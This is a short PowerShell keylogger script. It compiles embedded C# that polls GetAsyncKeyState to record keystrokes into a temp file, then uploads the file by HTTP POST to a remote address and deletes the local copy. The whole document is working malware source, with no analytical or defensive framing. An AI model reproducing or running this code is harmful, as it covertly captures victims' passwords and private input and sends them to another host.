# keylogger.ps1
$logPath = "$env:TEMP\klog.txt"
$endpoint = "http://192.168.6.111:8000/upload"
$code = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
public class Logger {
    [DllImport("User32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    public static void Start(string path) {
        StringBuilder buffer = new StringBuilder();
        while (true) {
            for (int i = 32; i < 127; i++) {
                int state = GetAsyncKeyState(i);
                if (state == -32767) {
                    buffer.Append((char)i);
                    if (buffer.Length > 20) {
                        File.AppendAllText(path, buffer.ToString());
                        buffer.Clear();
                    }
                }
            }
            System.Threading.Thread.Sleep(20);
        }
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp
[Logger]::Start($logPath)

# After user stops manually
if (Test-Path $logPath) {
    Invoke-WebRequest -Uri $endpoint -Method POST -InFile $logPath -UseBasicParsing
    Remove-Item $logPath -Force
}
